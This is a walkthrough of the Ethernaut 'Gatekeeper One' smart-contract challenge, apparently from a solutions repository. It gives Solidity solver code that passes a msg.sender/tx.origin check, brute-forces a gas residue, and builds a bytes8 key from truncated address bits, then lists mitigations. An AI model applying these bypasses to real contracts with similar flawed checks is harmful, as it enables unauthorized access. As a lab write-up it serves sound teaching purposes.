# 13. Gatekeeper One

[English](13_GatekeeperOne.md) | [한국어](../ko/13_GatekeeperOne.md)

## Objective

Satisfy all three gates and record the player as `entrant`.

## Key Concepts

- `msg.sender` and `tx.origin`
- Remaining-gas constraints
- Bit masks and integer truncation
- Low-level calls with explicit gas
- Search over a bounded residue class

## Gate One: Call Through a Contract

```solidity
require(msg.sender != tx.origin);
```

The player calls `GatekeeperOneSolver`, which then calls the target. Inside the target:

```text
tx.origin  = player
msg.sender = GatekeeperOneSolver
```

The two addresses are different, so the first gate passes.

## Gate Two: Match the Gas Residue

```solidity
require(gasleft() % 8191 == 0);
```

The exact `gasleft()` value inside the modifier is not simply the amount written in `call{gas: ...}`. Call setup, calldata handling, compiler output, and earlier instructions consume gas before the check.

Instead of hardcoding one environment-dependent offset, the solver tries every possible residue in a full modulus period:

```solidity
for (uint256 i = 0; i < 8191; i++) {
    uint256 gasToUse = (8191 * 10) + i;
    (bool success,) = target.call{gas: gasToUse}(
        abi.encodeWithSignature("enter(bytes8)", key)
    );

    if (success) return true;
}
```

A low-level call converts each reverted candidate into `success == false`, allowing the loop to continue.

## Gate Three: Build the Key

Let `K` be the key interpreted as `uint64`. The three constraints are:

```text
uint32(K) == uint16(K)
uint32(K) != uint64(K)
uint32(K) == uint16(uint160(tx.origin))
```

They imply the following bit layout:

```text
bits  0–15: low 16 bits of tx.origin
bits 16–31: all zero
bits 32–63: at least one nonzero bit
```

The test constructs exactly that value:

```solidity
uint64 keyValue = (uint64(1) << 32) | uint16(uint160(player));
bytes8 key = bytes8(keyValue);
```

The shifted `1` makes the upper 32 bits nonzero without changing the lower 32-bit constraints.

## Solution Flow

```text
Construct a bytes8 key from the player's low 16 address bits
        ↓
Player calls the solver
        ↓
Solver creates msg.sender != tx.origin
        ↓
Solver searches gas offsets modulo 8191
        ↓
One candidate reaches the gate with gasleft() % 8191 == 0
        ↓
The key passes all truncation checks
        ↓
Target records entrant = player
```

## Foundry Test

```solidity
vm.prank(player, player);
bool result = solver.solve(address(target), key);

assertTrue(result);
assertEq(target.entrant(), player);
```

The two-argument `prank` sets both `msg.sender` and `tx.origin` for the player's outer call.

## Root Cause

The contract treats call-chain shape, a fragile gas residue, and partial address bits as proof of eligibility. None of these values provides authentication or a stable authorization boundary.

## Recommended Mitigations

- Use explicit role or signature-based authorization.
- Do not use `tx.origin` for access control.
- Do not use `gasleft()` as an identity or eligibility check.
- Avoid authentication based on truncated address fragments.
- If precise gas behavior is operationally important, test across compiler versions and EVM upgrades without treating it as a security primitive.

## Run the Test

```bash
forge test --match-path test/13_GatekeeperOne.t.sol -vvv
```

## Takeaway

Gas values and sliced address bits can create puzzles, but they do not create trustworthy authorization. Security decisions should rely on explicit identities and verifiable permissions.
